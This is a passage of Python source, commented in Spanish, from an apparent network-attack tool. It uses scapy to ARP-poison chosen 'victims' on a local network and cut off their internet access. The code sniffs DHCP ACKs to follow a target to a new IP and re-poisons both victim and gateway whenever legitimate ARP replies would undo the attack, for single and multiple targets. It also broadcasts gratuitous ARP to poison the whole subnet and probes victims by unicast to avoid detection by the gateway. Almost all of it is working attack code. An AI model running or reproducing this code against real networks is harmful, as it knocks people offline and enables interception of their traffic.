            elif ip_nueva is None:
                # Objetivo no visible
                ciclos_offline += 1
                ciclos_estable = 0
                intervalo = _INTERVALO_OFFLINE  # Reintentar rápido

                if ciclos_offline == 1:
                    # Primera vez offline
                    with lock:
                        estado["online"] = False
                    write_callback(
                        f"⌛ Objetivo no visible (¿dormido/fuera de rango?)...\n"
                    )
                    self.logger.log(
                        f"[ARP] Objetivo offline: {ip_actual}", "warn"
                    )
                elif ciclos_offline % 6 == 0:
                    # Cada ~60s recordar que sigue offline
                    mins = (ciclos_offline * _INTERVALO_OFFLINE) // 60
                    write_callback(
                        f"⌛ Objetivo offline ({mins}+ min). "
                        f"Seguirá buscando...\n"
                    )

    # ── DHCP Sniffer pasivo ───────────────────────────────────────────
    def _dhcp_watcher(self, estado, lock, gateway, mac_src, write_callback):
        """Monitorea paquetes DHCP ACK para detectar cambios de IP
        instantáneamente, sin necesidad de escanear la red.

        Complementa al _seguimiento_loop: el sniffer detecta cambios
        en tiempo real (~0ms), y el polling sirve como fallback.

        Cuando detecta un cambio, envía una RÁFAGA BIDIRECCIONAL
        inmediata para cortar internet en la nueva IP.
        """
        try:
            from scapy.all import sniff, DHCP, IP, Ether, BOOTP, ARP, sendp
        except ImportError:
            return

        def _procesar(pkt):
            """Callback para cada paquete DHCP capturado."""
            if not _estado["arp"].is_set():
                return
            try:
                if DHCP not in pkt:
                    return

                # Buscar message-type en las opciones DHCP
                msg_type = None
                for opt in pkt[DHCP].options:
                    if isinstance(opt, tuple) and opt[0] == "message-type":
                        msg_type = opt[1]
                        break

                if msg_type != 5:  # Solo DHCP ACK
                    return

                # Extraer MAC del cliente desde BOOTP
                if BOOTP in pkt:
                    mac_raw = pkt[BOOTP].chaddr[:6]
                    mac_cliente = ":".join(f"{b:02x}" for b in mac_raw)
                else:
                    return

                # Extraer IP asignada (yiaddr = your IP address)
                ip_asignada = pkt[BOOTP].yiaddr
                if not ip_asignada or ip_asignada == "0.0.0.0":
                    return

                mac_norm = _normalizar_mac(mac_cliente)
                with lock:
                    mac_objetivo = _normalizar_mac(estado["mac"])
                    ip_actual = estado["ip"]
                    mac_gw = estado["mac_gw_real"]

                if mac_norm == mac_objetivo:
                    if ip_asignada != ip_actual:
                        # ¡El objetivo recibió una IP nueva!
                        mac_nueva = _obtener_mac(ip_asignada) or mac_cliente
                        fab = _fabricante_mac(mac_nueva)
                        with lock:
                            old_ip = estado["ip"]
                            estado["ip"] = ip_asignada
                            estado["mac"] = mac_nueva
                            estado["fabricante"] = fab
                            estado["online"] = True
                            estado["cambios_ip"] += 1
                            estado["ultimo_cambio"] = time.time()
                        write_callback(
                            f"⚡ DHCP detectó cambio: {old_ip} → {ip_asignada} "
                            f"(instantáneo)\n"
                        )
                        self.logger.log(
                            f"[ARP] DHCP ACK: {old_ip} → {ip_asignada}", "warn"
                        )

                        # RÁFAGA BIDIRECCIONAL inmediata
                        write_callback(f"  ⚡ Cortando internet en {ip_asignada}...\n")
                        for _ in range(10):
                            pkt_v = (Ether(src=mac_src, dst=mac_nueva) /
                                     ARP(pdst=ip_asignada, hwdst=mac_nueva,
                                         psrc=gateway, hwsrc=mac_src, op=2))
                            sendp(pkt_v, verbose=0)
                            if mac_gw:
                                pkt_g = (Ether(src=mac_src, dst=mac_gw) /
                                         ARP(pdst=gateway, hwdst=mac_gw,
                                             psrc=ip_asignada, hwsrc=mac_src, op=2))
                                sendp(pkt_g, verbose=0)
                            time.sleep(0.03)

                        # Envenenar IP antigua en el gateway
                        if mac_gw:
                            for _ in range(3):
                                pkt_old = (Ether(src=mac_src, dst=mac_gw) /
                                           ARP(pdst=gateway, hwdst=mac_gw,
                                               psrc=old_ip, hwsrc=mac_src, op=2))
                                sendp(pkt_old, verbose=0)

                        write_callback(f"  ✔ Internet cortado en nueva IP\n")

                    else:
                        # Misma IP: DHCP ACK de renovación sin cambio.
                        # Aún así, re-envenenar por si la renovación
                        # hizo que la víctima verificara su gateway
                        mac_act = mac_norm
                        for _ in range(5):
                            pkt_v = (Ether(src=mac_src, dst=mac_act) /
                                     ARP(pdst=ip_asignada, hwdst=mac_act,
                                         psrc=gateway, hwsrc=mac_src, op=2))
                            sendp(pkt_v, verbose=0)
                            if mac_gw:
                                pkt_g = (Ether(src=mac_src, dst=mac_gw) /
                                         ARP(pdst=gateway, hwdst=mac_gw,
                                             psrc=ip_asignada, hwsrc=mac_src, op=2))
                                sendp(pkt_g, verbose=0)
                            time.sleep(0.03)

            except Exception:
                pass  # No romper el sniffer por errores puntuales

        try:
            sniff(
                filter="udp and (port 67 or port 68)",
                prn=_procesar,
                stop_filter=lambda _: not _estado["arp"].is_set(),
                store=False
            )
        except Exception:
            pass  # Si el sniffer DHCP falla, el polling sigue funcionando

    # ── Monitor reactivo BIDIRECCIONAL ────────────────────────────────
    def _arp_monitor(self, estado, lock, gateway, mac_src, write_callback):
        """Monitorea tráfico ARP y re-envenena inmediatamente si:
          1. La víctima pregunta por el gateway (who-has, op=1)
          2. El gateway real responde con su MAC legítima (is-at, op=2)
             → La víctima restauraría su caché, hay que re-envenenar.
          3. El gateway pregunta por la víctima (who-has, op=1)
             → Re-envenenar gateway para que no localice a la víctima.
          4. La víctima responde al gateway con su MAC real
             → Re-envenenar gateway para sobrescribir la respuesta.

        BIDIRECCIONAL: se re-envenena SIEMPRE en ambas direcciones
        para mantener el corte total de internet.
        """
        try:
            from scapy.all import ARP, Ether, sniff, sendp
        except ImportError:
            return

        def _construir_pkt_victima(ip_dst, mac_dst):
            return (Ether(src=mac_src, dst=mac_dst) /
                    ARP(pdst=ip_dst, hwdst=mac_dst,
                        psrc=gateway, hwsrc=mac_src, op=2))

        def _construir_pkt_gateway(ip_victima, mac_gw):
            if not mac_gw:
                return None
            return (Ether(src=mac_src, dst=mac_gw) /
                    ARP(pdst=gateway, hwdst=mac_gw,
                        psrc=ip_victima, hwsrc=mac_src, op=2))

        def _react(p):
            if not _estado["arp"].is_set():
                return
            if ARP not in p:
                return

            with lock:
                ip_act, mac_act = estado["ip"], estado["mac"]
                mac_gw = estado.get("mac_gw_real")

            # ── Caso 1: la víctima pregunta "¿quién es el gateway?" ──
            # Respondemos inmediatamente con nuestra MAC falsa
            # Y también re-envenenamos al gateway
            if p[ARP].op == 1:  # who-has
                if p[ARP].psrc == ip_act and p[ARP].pdst == gateway:
                    # Envenenar víctima (respuesta rápida)
                    sendp(_construir_pkt_victima(ip_act, mac_act),
                          verbose=0, count=5)
                    # Envenenar gateway también
                    pkt_gw = _construir_pkt_gateway(ip_act, mac_gw)
                    if pkt_gw:
                        sendp(pkt_gw, verbose=0, count=3)

                # ── Caso 3: el gateway pregunta por la víctima ────────
                # Re-envenenar gateway para que no localice la víctima
                elif p[ARP].psrc == gateway and p[ARP].pdst == ip_act:
                    pkt_gw = _construir_pkt_gateway(ip_act, mac_gw)
                    if pkt_gw:
                        sendp(pkt_gw, verbose=0, count=5)
                    # También re-envenenar víctima
                    sendp(_construir_pkt_victima(ip_act, mac_act),
                          verbose=0, count=3)

            # ── Caso 2: el gateway real responde con su MAC legítima ─
            # Esto sobrescribiría nuestro envenenamiento → re-envenenar
            elif p[ARP].op == 2:  # is-at
                if p[ARP].psrc == gateway and mac_gw:
                    # El gateway está respondiendo con su MAC real
                    if p[ARP].hwsrc == mac_gw:
                        # Si va dirigido a la víctima o es broadcast
                        dst = p[Ether].dst if Ether in p else ""
                        if dst == mac_act or dst == "ff:ff:ff:ff:ff:ff":
                            # Re-envenenar AMBAS direcciones
                            sendp(_construir_pkt_victima(ip_act, mac_act),
                                  verbose=0, count=5)
                            pkt_gw = _construir_pkt_gateway(ip_act, mac_gw)
                            if pkt_gw:
                                sendp(pkt_gw, verbose=0, count=3)

                # ── Caso 4: la víctima responde con su MAC real ──────
                # El gateway recuperaría la ruta real → re-envenenar
                elif p[ARP].psrc == ip_act:
                    if p[ARP].hwsrc == mac_act:
                        dst = p[Ether].dst if Ether in p else ""
                        if dst == mac_gw or dst == "ff:ff:ff:ff:ff:ff":
                            # Re-envenenar gateway
                            pkt_gw = _construir_pkt_gateway(ip_act, mac_gw)
                            if pkt_gw:
                                sendp(pkt_gw, verbose=0, count=5)
                            # También re-envenenar víctima
                            sendp(_construir_pkt_victima(ip_act, mac_act),
                                  verbose=0, count=3)

        sniff(filter="arp", prn=_react,
              stop_filter=lambda _: not _estado["arp"].is_set(), store=False)

    # ── Monitor reactivo multi-target BIDIRECCIONAL ───────────────────
    def _arp_monitor_multi(self, targets, lock, gateway, mac_src,
                           mac_gw_real, write_callback):
        """Monitor reactivo BIDIRECCIONAL para ataque multi-target.
        Vigila si CUALQUIER víctima pregunta por el gateway, si el
        gateway pregunta por alguna víctima, y si alguno responde
        con su MAC real → re-envenena de inmediato en ambas direcciones.
        """
        try:
            from scapy.all import ARP, Ether, sniff, sendp
        except ImportError:
            return

        def _react(p):
            if not _estado["arp"].is_set():
                return
            if ARP not in p:
                return

            # ── Caso 1: alguna víctima pregunta por el gateway ────────
            if p[ARP].op == 1:  # who-has
                src_ip = p[ARP].psrc
                dst_ip = p[ARP].pdst

                if dst_ip == gateway:
                    with lock:
                        if src_ip in targets:
                            info = targets[src_ip]
                            # Envenenar víctima
                            pkt_v = (Ether(src=mac_src, dst=info["mac"]) /
                                     ARP(pdst=src_ip, hwdst=info["mac"],
                                         psrc=gateway, hwsrc=mac_src, op=2))
                            sendp(pkt_v, verbose=0, count=5)
                            # Envenenar gateway
                            if mac_gw_real:
                                pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                         ARP(pdst=gateway, hwdst=mac_gw_real,
                                             psrc=src_ip, hwsrc=mac_src, op=2))
                                sendp(pkt_g, verbose=0, count=3)

                # El gateway pregunta por alguna víctima
                elif src_ip == gateway:
                    with lock:
                        if dst_ip in targets:
                            info = targets[dst_ip]
                            # Envenenar gateway
                            if mac_gw_real:
                                pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                         ARP(pdst=gateway, hwdst=mac_gw_real,
                                             psrc=dst_ip, hwsrc=mac_src, op=2))
                                sendp(pkt_g, verbose=0, count=5)
                            # Envenenar víctima
                            pkt_v = (Ether(src=mac_src, dst=info["mac"]) /
                                     ARP(pdst=dst_ip, hwdst=info["mac"],
                                         psrc=gateway, hwsrc=mac_src, op=2))
                            sendp(pkt_v, verbose=0, count=3)

            # ── Caso 2: gateway responde con su MAC real ──────────────
            elif p[ARP].op == 2 and mac_gw_real:  # is-at
                if p[ARP].psrc == gateway and p[ARP].hwsrc == mac_gw_real:
                    dst = p[Ether].dst if Ether in p else ""
                    with lock:
                        if dst == "ff:ff:ff:ff:ff:ff":
                            # Broadcast: re-envenenar TODAS bidireccional
                            for ip, info in targets.items():
                                pkt_v = (Ether(src=mac_src, dst=info["mac"]) /
                                         ARP(pdst=ip, hwdst=info["mac"],
                                             psrc=gateway, hwsrc=mac_src, op=2))
                                sendp(pkt_v, verbose=0, count=3)
                                pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                         ARP(pdst=gateway, hwdst=mac_gw_real,
                                             psrc=ip, hwsrc=mac_src, op=2))
                                sendp(pkt_g, verbose=0, count=2)
                        else:
                            # Unicast: buscar la víctima destino
                            for ip, info in targets.items():
                                if info["mac"] == dst:
                                    pkt_v = (Ether(src=mac_src, dst=dst) /
                                             ARP(pdst=ip, hwdst=dst,
                                                 psrc=gateway, hwsrc=mac_src,
                                                 op=2))
                                    sendp(pkt_v, verbose=0, count=5)
                                    pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                             ARP(pdst=gateway, hwdst=mac_gw_real,
                                                 psrc=ip, hwsrc=mac_src, op=2))
                                    sendp(pkt_g, verbose=0, count=3)
                                    break

                # Alguna víctima responde con su MAC real al gateway
                else:
                    src_ip = p[ARP].psrc
                    with lock:
                        if src_ip in targets:
                            info = targets[src_ip]
                            dst = p[Ether].dst if Ether in p else ""
                            if dst == mac_gw_real or dst == "ff:ff:ff:ff:ff:ff":
                                # Re-envenenar gateway
                                if mac_gw_real:
                                    pkt_g = (Ether(src=mac_src, dst=mac_gw_real) /
                                             ARP(pdst=gateway, hwdst=mac_gw_real,
                                                 psrc=src_ip, hwsrc=mac_src, op=2))
                                    sendp(pkt_g, verbose=0, count=5)
                                # Re-envenenar víctima
                                pkt_v = (Ether(src=mac_src, dst=info["mac"]) /
                                         ARP(pdst=src_ip, hwdst=info["mac"],
                                             psrc=gateway, hwsrc=mac_src, op=2))
                                sendp(pkt_v, verbose=0, count=3)

        sniff(filter="arp", prn=_react,
              stop_filter=lambda _: not _estado["arp"].is_set(), store=False)

    # ── Gratuitous ARP ────────────────────────────────────────────────
    def _enviar_garp(self, ip_gateway, mac_src, write_callback):
        """Envía un Gratuitous ARP broadcast.

        Dice a TODA la subred: "El gateway ({ip_gateway}) está en
        {mac_src}". Envenena todos los hosts de un golpe.
        Más ruidoso que unicast, pero más eficiente para multi-target.
        """
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return
        pkt = (Ether(src=mac_src, dst="ff:ff:ff:ff:ff:ff") /
               ARP(op=2,
                   psrc=ip_gateway,
                   hwsrc=mac_src,
                   pdst=ip_gateway,
                   hwdst="ff:ff:ff:ff:ff:ff"))
        sendp(pkt, verbose=0)
        write_callback("  📡 GARP broadcast → toda la subred\n")

    # ── Verificación de efectividad ───────────────────────────────────
    def _verificar_efectividad(self, ip_victima):
        """Comprueba si la víctima sigue activa en la red (broadcast).

        Envía un ARP request broadcast a la víctima. Si responde, el
        dispositivo sigue en la red. Usado en multi-target donde no
        conocemos la MAC actualizada de cada víctima.
        """
        try:
            mac = _obtener_mac(ip_victima, intentos=1)
            return mac is not None
        except Exception:
            return False

    def _verificar_efectividad_unicast(self, ip_victima, mac_victima):
        """Comprueba si la víctima sigue activa usando unicast directo.

        A diferencia de _verificar_efectividad (broadcast), esta versión
        envía el ARP request directamente a la MAC de la víctima en vez
        de a ff:ff:ff:ff:ff:ff. Esto evita que el gateway vea la
        petición y responda con su MAC real, lo cual podría deshacer
        parcialmente el envenenamiento.
        """
        try:
            from scapy.all import Ether, ARP, srp
            pkt = (Ether(dst=mac_victima) /
                   ARP(pdst=ip_victima, op=1))
            ans, _ = srp(pkt, timeout=1.5, verbose=0, retry=0)
            return len(ans) > 0
        except Exception:
            return False

    # ── Restauración ARP BIDIRECCIONAL ────────────────────────────────
    def _restore_arp(self, ip_target, gateway, mac_obj, mac_gw_real, write_callback):
        """Restaura la tabla ARP de la víctima Y del gateway al valor legítimo."""
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            return

        write_callback("⟳ Restaurando ARP...\n")

        # Obtener la MAC real del gateway (si no la tenemos ya)
        mac_gw = mac_gw_real or _obtener_mac(gateway)
        if mac_obj and mac_gw:
            # Restaurar víctima: "El gateway está en su MAC real"
            rest_v = (Ether(src=mac_gw, dst=mac_obj) /
                      ARP(pdst=ip_target, hwdst=mac_obj,
                          psrc=gateway, hwsrc=mac_gw, op=2))

            # Restaurar gateway: "La víctima está en su MAC real"
            rest_g = (Ether(src=mac_obj, dst=mac_gw) /
                      ARP(pdst=gateway, hwdst=mac_gw,
                          psrc=ip_target, hwsrc=mac_obj, op=2))

            sendp(rest_v, count=8, verbose=0)
            sendp(rest_g, count=8, verbose=0)
            write_callback("✔ Tablas ARP restauradas (víctima + gateway).\n")
            self.logger.log("[ARP] Tablas ARP restauradas (bidireccional).", "ok")
        else:
            write_callback("⚠ Restauración parcial (no se pudo resolver MAC del gateway).\n")
            self.logger.log("[ARP] Restauración parcial.", "warn")
